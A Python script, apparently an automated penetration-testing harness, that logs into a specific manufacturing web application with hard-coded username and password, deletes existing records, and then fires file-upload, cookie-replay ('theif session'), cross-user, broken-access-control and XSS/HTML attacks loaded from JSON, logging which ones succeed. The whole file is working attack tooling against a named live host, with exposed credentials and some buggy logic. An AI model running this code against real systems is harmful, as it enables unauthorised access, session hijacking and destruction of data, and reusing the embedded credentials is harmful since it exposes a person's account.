import requests
import uuid
import json
from mes.otheruser import *
from mes.brokenacess import *
from bs4 import BeautifulSoup
#138
#checking file upload vulnerability
def check_file_uplaod(endpoint,session):
    with open("mes\injectionfile.py",'rb') as injection:
        binary=injection.read()
    post_res=session.post(endpoint,files={"process":("injection.py",binary,'application/x-python'),
            "csrfmiddlewaretoken":session.cookies.get('csrftoken')},headers={'Referer':'https://smartfactory.bevywise.com/'})
    return post_res
#appending details for deletion
def append_details(payload,csrf,id=None,data=None):
    if(id==None and data==None):
        payload["csrfmiddlewaretoken"]=csrf
    elif(id!=None and data==None):
        payload["id"]=id
        payload["csrfmiddlewaretoken"]=csrf
    else:
        for item in data['data']:
            if item['id']==id:
                payload['id']=id #hfl-GI4B42VFDMKGkMW1
                payload['csrfmiddlewaretoken']=csrf
                payload['email_id']=item['employee_no']
                print(payload)
    return payload
#deleting elements before automation
def delete_elements(session,url,endpoint,payload):
    res=session.get(url)
    if res.ok:
        data=res.json()
        id_values=[item['id']for item in data['data']]
        print("Ids in:",url,"are",id_values)
        print(endpoint)
        for id in id_values:
            if(endpoint=="https://smartfactory.bevywise.com/emp_master_delete_emp"):
                payload=append_details(payload,session.cookies.get('csrftoken'),id,data)
            else:
                payload=append_details(payload,session.cookies.get('csrftoken'),id)
            print(payload)
            del_res=session.post(endpoint,data=payload,headers={'Referer':'https://smartfactory.bevywise.com'})
            if del_res.ok:
                print("success")
            else:
                print(del_res.text)
#for delete attack check
def get_element(session,url):
    res=session.get(url)
    if res.ok:
        data=res.json()
        if(url=="https://smartfactory.bevywise.com/process"):
            id_values=[item['id'] for item in data['data'] if item["process_name"] != "vmpprocess" and item["process_name"]!="process1" and item["process_name"]!="process2"]
        elif(url=="https://smartfactory.bevywise.com/machine"):
            id_values=[item['id'] for item in data['data'] if item["machine_id"] != "vmpmachine"]
        elif(url=="https://smartfactory.bevywise.com/parts"):
            id_values=[item['id'] for item in data['data'] if item["part_no"] != "part1" and item["part_no"]!="part2"]
        elif(url=="https://smartfactory.bevywise.com/cycle_times"):
            id_values=[item['id'] for item in data['data'] if item["process_name"] != "vmpprocess"]
        elif(url=="https://smartfactory.bevywise.com/bad_quality_reason"):
            id_values=[item['id'] for item in data['data'] if item["reason"] != "admin navigation"]
        elif(url=="https://smartfactory.bevywise.com/downtime_reason"):
            id_values=[item['id'] for item in data['data'] if item["reason"] != "admin navigation"]
        elif(url=="https://smartfactory.bevywise.com/target"):
            id_values=[item['id'] for item in data['data'] if item["department"] != "vmpprocess"]
        elif(url=="https://smartfactory.bevywise.com/rm_vs_parts_page"):
            id_values=[item['id'] for item in data['data'] if item["raw_material"] != "vmp raw material"]
        elif(url=="https://smartfactory.bevywise.com/consumable_page"):
            id_values=[item['id'] for item in data['data'] if item["consumable_number"] != "adminnavconsumable"]
        elif(url=="https://smartfactory.bevywise.com/customer_page"):
            id_values=[item['id'] for item in data['data'] if item["customer_name"] != "adminnavcust"]
        elif(url=="https://smartfactory.bevywise.com/vendor_page"):
            id_values=[item['id'] for item in data['data'] if item["vendor_name"] != "adminnavvendor"]
        else:
            id_values=[item['id']for item in data['data']]
        return id_values[0]
    else:
        print("error getting endpoint")
#creating a theif session using sessionid
def get_theif_session(cookies):
    session=requests.Session()
    session.cookies.update(cookies)
    session.get("https://smartfactory.bevywise.com/login")
    return session
#generating uuid for login
def generate_uuid():
    return str(uuid.uuid4())
#automation start here
def mes_test():
    session=requests.Session()
    login_csrf_response=session.get("https://smartfactory.bevywise.com/login/")
    login_csrf=login_csrf_response.cookies.get('csrftoken')
    login_data={
        "username": "venkat7venkatesh77@gmail.com",
        "password": "@Venkystark77",
        "req_id": generate_uuid(),
        "csrfmiddlewaretoken": login_csrf
    }
    login_response=session.post("https://smartfactory.bevywise.com/entry/login_check",data=login_data)
    if login_response.ok:
        #importing the json file
        print(session)
        print("session cookies:",session.cookies)
        with open('mes\\urlfiles.json') as json_file:
            json_data = json.load(json_file)
        #deleting existing data in all pages
        for top_key in json_data:
            sub_json=json_data[top_key]
            for sub_key in sub_json:
                if(sub_key=="https://smartfactory.bevywise.com/master_delete" or sub_key=="https://smartfactory.bevywise.com/emp_master_delete_emp"):
                    inner_json=sub_json[sub_key]
                    delete_elements(session,url,sub_key,inner_json["from_other_user"])
                else:
                    url=sub_key
        #creating users in employee page
        create_elements(session)
        create_users(session)
        for top_key in json_data: #topKey refers to the top url,sub key is api,inner keys are attack payloads
            sub_json=json_data[top_key]
            for sub_key in sub_json:
                inner_json=sub_json[sub_key]
                for inner_key in inner_json:
                    if(sub_key!="https://smartfactory.bevywise.com/master_delete"):
                        url=sub_key
                    if(inner_key=="fileupload"):
                        if(top_key=="https://smartfactory.bevywise.com/process_page"):
                            attack_res=check_file_uplaod("https://smartfactory.bevywise.com/import_process/",session)
                        elif(top_key=="https://smartfactory.bevywise.com/machine_page",session):
                            attack_res=check_file_uplaod("https://smartfactory.bevywise.com/import_machine/",session)
                        elif(top_key=="https://smartfactory.bevywise.com/parts_page"):
                            attack_res=check_file_uplaod("https://smartfactory.bevywise.com/import_parts/",session)
                        elif(top_key=="https://smartfactory.bevywise.com/tools"):
                            attack_res=check_file_uplaod("https://smartfactory.bevywise.com/import_tools/",session)
                        elif(top_key=="https://smartfactory.bevywise.com/error-reason"):
                            attack_res=check_file_uplaod("https://smartfactory.bevywise.com/Importrejectionreasons/",session)
                        elif(top_key=="https://smartfactory.bevywise.com/downtime-reason"):
                            attack_res=check_file_uplaod("https://smartfactory.bevywise.com/Importdowntimereasons/",session)
                        elif(top_key=="https://smartfactory.bevywise.com/rawmaterial"):
                            attack_res=check_file_uplaod("https://smartfactory.bevywise.com/import_rawmaterial/",session)
                        elif(top_key=="https://smartfactory.bevywise.com/consumable"):
                            attack_res=check_file_uplaod("https://smartfactory.bevywise.com/import_consumable/",session)
                        elif(top_key=="https://smartfactory.bevywise.com/vendor"):
                                attack_res=check_file_uplaod("https://smartfactory.bevywise.com/import_vendor/",session)
                    elif(inner_key=="from_other_user"):
                        outsider_session=get_other_user_session()
                        if(sub_key=="https://smartfactory.bevywise.com/master_delete"):
                            id=get_element(session,url)
                            print("got id in other_user attack:",id)
                            inner_json[inner_key]=append_details(inner_json[inner_key],theif_session.cookies.get('csrftoken'),id)
                        else:
                            inner_json[inner_key]=append_details(inner_json[inner_key],session.cookies.get('csrftoken'))
                        attack_res=outsider_session.post(sub_key,data=inner_json[inner_key],headers={'Referer':'https://smartfactory.bevywise.com'})
                    elif(inner_key=="session_cookies_theft"):
                        theif_session=get_theif_session(session.cookies)
                        if(sub_key=="https://smartfactory.bevywise.com/master_delete"):
                            id=get_element(theif_session,url)
                            print("got id in theif sesseion attack:",id)
                            inner_json[inner_key]=append_details(inner_json[inner_key],theif_session.cookies.get('csrftoken'),id)
                        else:
                            inner_json[inner_key]=append_details(inner_json[inner_key],theif_session.cookies.get('csrftoken'))
                        attack_res=theif_session.post(sub_key,data=inner_json[inner_key],headers={'Referer':'https://smartfactory.bevywise.com'})
                    elif(inner_key=="BA_SE" or inner_key=="BA_SM" or inner_key=="BA_SV" or inner_key=="BA_ME" or inner_key=="BA_MM" or inner_key=="BA_PH" or inner_key=="BA_PS" or inner_key=="BA_PO"):
                        bac=False
                        broken=get_ba_session(inner_key)
                        broken_text=broken.get(top_key).text
                        auth_text=session.get(top_key).text
                        soup1 = BeautifulSoup(broken_text, 'html.parser')
                        soup2 = BeautifulSoup(auth_text, 'html.parser')

                        # Extract body content
                        body_content1 = soup1.find('body').get_text().strip()
                        body_content2 = soup2.find('body').get_text().strip()

                        # Check if the body content is the same
                        if body_content1 == body_content2:
                            bac=True
                        attack_res=broken.get(top_key)
                        print("page:",top_key,"bac:",bac)
                        if(bac):
                            attack_res.status_code=200
                        else:
                            attack_res.status_code=250
                    else:
                        inner_json[inner_key]=append_details(inner_json[inner_key],session.cookies.get('csrftoken'))
                        print("in for loop",inner_json[inner_key])
                        print(sub_key)
                        attack_res=session.post(sub_key,data=inner_json[inner_key],headers={'Referer':'https://smartfactory.bevywise.com'})
                    if(sub_key!="https://smartfactory.bevywise.com/master_delete"):
                        if(inner_key=="xss_attack" or inner_key=="html_attack"):
                            if attack_res.text.__contains__("failed"):
                                #s_code=250
                                attack_res.status_code=250
                            # else:
                            #     #s_code=attack_res.status_code
                            report_res={
                            "Page":top_key,
                            "Attack":inner_key,
                            "Statuscode":attack_res.status_code                      
                            }
                        else:
                            report_res={
                            "Page":top_key,
                            "Attack":inner_key,
                            "Statuscode":attack_res.status_code                     
                            }
                        try:
                            with open('mes\\mes_attack_report.json','r') as file:
                                data=json.load(file)
                        except FileNotFoundError:
                            data=[]
                        data.append(report_res)
                        with open('mes\\mes_attack_report.json','w') as file:
                            json.dump(data,file,indent=4)
                    if(inner_key!="fileupload" and inner_key!="BA_SE" and inner_key!="BA_SM" and inner_key!="BA_SV" and inner_key!="BA_ME" and inner_key!="BA_MM" and inner_key!="BA_PH" and inner_key!="BA_PS" and inner_key!="BA_PO"):
                        print("Page:",top_key,"Endpoint:",sub_key,"Attack_name:",inner_key,"Status:",attack_res.status_code,"responses_text:",attack_res.text)
                    if attack_res.status_code==200:
                        print('success')
                        if(top_key=="https://smartfactory.bevywise.com/maintenance/main_dashboard/#Dashboard"):
                            response_text="web content"
                        elif(inner_key=="BA_SE" or inner_key=="BA_SM" or inner_key=="BA_SV" or inner_key=="BA_MM" or inner_key=="BA_ME" or inner_key=="BA_PH" or inner_key=="BA_PS" or inner_key=="BA_PO" or inner_key=="fileupload"):
                            response_text="web content"
                        else:
                            response_text=attack_res.text
                        attack_result = {
                            "Page":top_key,
                            "Endpoint":sub_key,
                            "Attack":inner_key,
                            "Payload":inner_json[inner_key],
                            "Statuscode":attack_res.status_code,
                            "AttackResponse":response_text
                        }
                        # Write the attack result to a JSON file
                        try:
                            with open('mes\\mes_success_attacks.json', 'r') as file:
                                data = json.load(file)
                        except FileNotFoundError:
                            data = []
                        data.append(attack_result)
                        with open('mes\\mes_success_attacks.json', 'w') as file:
                            json.dump(data, file, indent=4)
                    else:
                        if(inner_key=="BA_SE" or inner_key=="BA_SM" or inner_key=="BA_SV" or inner_key=="BA_MM" or inner_key=="BA_ME" or inner_key=="BA_PH" or inner_key=="BA_PS" or inner_key=="BA_PO" or inner_key=="fileupload"):
                            response_text="web content"
                        elif(top_key=="https://smartfactory.bevywise.com/maintenance/main_dashboard/#Dashboard"):
                            response_text="web content"
                        else:
                            response_text=attack_res.text
                        attack_result = {
                            "Page":top_key,
                            "Endpoint":sub_key,
                            "Attack":inner_key,
                            "Payload":inner_json[inner_key],
                            "Statuscode":attack_res.status_code,
                            "AttackResponse":response_text
                        }
                        # Write the attack result to a JSON file
                        try:
                            with open('mes\\mes_failure_attacks.json', 'r') as file:
                                data = json.load(file)
                        except FileNotFoundError:
                            data = []
                        data.append(attack_result)
                        with open('mes\\mes_failure_attacks.json', 'w') as file:
                            json.dump(data, file, indent=4)